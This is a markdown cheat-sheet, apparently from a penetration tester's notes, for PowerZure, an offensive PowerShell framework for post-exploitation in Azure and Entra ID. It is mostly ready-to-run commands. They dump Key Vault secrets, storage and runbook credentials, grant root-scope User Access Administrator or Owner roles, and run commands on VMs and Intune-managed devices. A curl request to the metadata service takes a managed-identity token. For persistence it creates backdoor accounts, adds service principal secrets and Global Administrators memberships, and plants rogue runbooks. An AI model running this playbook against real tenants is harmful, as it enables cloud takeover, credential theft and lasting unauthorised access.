# PowerZure

**Tags:** `#powerzure` `#azure` `#cloud` `#powershell` `#enumeration` `#postexploitation` `#privesc` `#persistence`

PowerShell offensive Azure framework for post-exploitation after gaining Azure credentials. Covers enumeration, privilege escalation, persistence, lateral movement, and data exfiltration across Azure and Entra ID. More structured workflow than MicroBurst — designed to walk through an engagement step by step.

**Source:** https://github.com/hausec/PowerZure
**Install:**
```powershell
git clone https://github.com/hausec/PowerZure
Import-Module .\PowerZure.psd1        # module manifest — NOT PowerZure.ps1

# Requires Az + AzureAD modules
Install-Module Az -Scope CurrentUser
Connect-AzAccount
```

> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. List it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`. **Re-verified 2026-09-27 (docs) and again 2026-09-28 against `PowerZure.psd1` FunctionsToExport.** Confirmed-wrong names: `New-AzureADUser`→`New-AzureUser`, `Add-AzureADSPSecret`→`Add-AzureSPSecret` (the `AD`-infix forms are **not** exported). **Correction to the prior pass:** `Add-AzureADRole` and `Invoke-AzureMIBackdoor` **ARE** exported by the manifest — an earlier revision wrongly flagged them as invented. They exist (lightly documented); confirm their parameters on-box with `Get-Help`. The manifest also exports `Get-AzureDeviceOwner`, `Get-AzureIntuneScript`, `Invoke-AzureVMUserDataAgent`, `Connect-AzureJWT`, and `Start-AzureRunbook`.

> [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has a more structured workflow and covers more Entra ID attack paths. MicroBurst has broader one-shot credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.

---

## Initial Recon

```powershell
# Menu / self-check of what you can do with the current context
Invoke-PowerZure -h

# Who am I? Then the big one — enumerate everything you can touch
Get-AzureCurrentUser
Get-AzureTarget                       # VMs, storage, Key Vaults, apps, RBAC, etc. you can reach
Get-AzureTarget -List                 # list form
Get-AzureTenantId
Set-AzureSubscription -Id <sub-id>    # switch active subscription
```

---

## User, Role & App Enumeration

```powershell
# Users
Get-AzureUser -All
Get-AzureUser -Username <upn>

# Group membership
Get-AzureGroupMember -Group "Global Administrators"

# Roles — assignments, members, and the raw permission set
Get-AzureRole -All
Get-AzureRoleMember -Role "Owner"
Get-AzureRolePermission -Role <role>
Get-AzurePIMAssignment                # eligible (PIM) roles — activation = privesc

# Apps / SPs / managed identities
Get-AzureAppOwner -App <name>
Get-AzureManagedIdentity
```

---

## Resource Enumeration & Loot

```powershell
# Key Vault contents (secrets/keys/certs) — read, or dump everything
Get-AzureKeyVaultContent -VaultName <vault>
Show-AzureKeyVaultContent -All        # enumerate across all readable vaults
Export-AzureKeyVaultContent -VaultName <vault>

# Storage — list and pull blobs/file shares
Get-AzureStorageContent -StorageAccountName <name> -ContainerName <container>
Show-AzureStorageContent -StorageAccountName <name>

# Automation: RunAs identity, certs, and runbook source (often holds creds)
Get-AzureRunAsAccount
Get-AzureRunAsCertificate
Get-AzureRunbookContent -All

# Logic App connectors (frequently carry stored credentials) + SQL + VM disks
Get-AzureLogicAppConnector
Get-AzureSQLDB -All
Get-AzureVMDisk
```

---

## Privilege Escalation

```powershell
# The classic PowerZure privesc: if you can elevate access, grant yourself
# User Access Administrator at root scope over all subscriptions.
Set-AzureElevatedPrivileges

# Assign a role to a principal (needs Microsoft.Authorization/roleAssignments/write)
Add-AzureRole -Role "Owner" -Username <upn> -Scope "/subscriptions/<sub-id>"

# VM code execution (needs VM Contributor+) — several delivery methods:
Invoke-AzureRunCommand -VMName <name> -Command 'whoami /all'
Invoke-AzureRunProgram -VMName <name> -Command '...'          # run an uploaded program
Invoke-AzureRunMSBuild -VMName <name> -File '...'             # MSBuild inline-task exec
Invoke-AzureCustomScriptExtension -VMName <name> -Command '...'
Invoke-AzureVMUserDataCommand -VMName <name> -Command '...'   # via user-data agent
New-AzureIntuneScript -Script '...'                          # push a script to Intune-managed devices

# Managed-identity token from inside a VM (run on the target VM)
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Persistence

```powershell
# Backdoor: create a new user or service principal with a role
New-AzureBackdoor -Username backdoor -Password 'P@ssw0rd123!'

# New Entra user / add secret to an existing app registration (persistent app auth)
# (the AD-infix forms New-AzureADUser / Add-AzureADSPSecret are NOT exported — use these)
New-AzureUser -Username backdoor@company.com -Password 'P@ssw0rd123!'
Add-AzureSPSecret -AppName <name>             # or -AppID <app-id>

# Add to a privileged group, add an Entra DIRECTORY role, or reset a password
Add-AzureGroupMember -Group "Global Administrators" -Username <upn>
Add-AzureADRole    # exported by the manifest — adds an Entra directory role; confirm params with Get-Help on-box
Set-AzureUserPassword -Username <upn> -Password 'NewPass123!'

# Managed-identity backdoor + arbitrary command via a rogue Automation runbook
Invoke-AzureMIBackdoor    # exported by the manifest; confirm behaviour/params on-box
Invoke-AzureCommandRunbook -Command 'whoami'
```

---

> [!note] **See also** — pair with [[Tools/Cloud/MicroBurst|MicroBurst]] (`Get-AzPasswords` for one-shot cred harvest) and [[Tools/Cloud/AADInternals|AADInternals]] (identity/Entra attacks). Get an access token from either, or via [[Tools/Cloud/ROADtools|ROADtools]] `roadtx`.

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
